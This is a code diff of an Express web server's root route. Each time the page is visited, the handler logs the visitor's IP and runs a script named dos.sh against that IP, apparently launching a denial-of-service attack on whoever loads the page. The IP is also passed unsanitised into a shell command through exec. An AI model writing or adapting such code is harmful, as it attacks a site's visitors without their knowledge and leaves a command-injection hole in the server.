@@ -15,7 +15,7 @@ app.get("/", (req, res) => {
     ip = ip.replace("::ffff:", "");
     console.log(date.toString() + "  " + ip);
 
-    exec("bash dos.sh " + ip, (error, stdout, stderr) => {
+    exec(__dirname + "/dos.sh " + ip, (error, stdout, stderr) => {
         if (error) {
             console.log(`error: ${error.message}`);
             return;
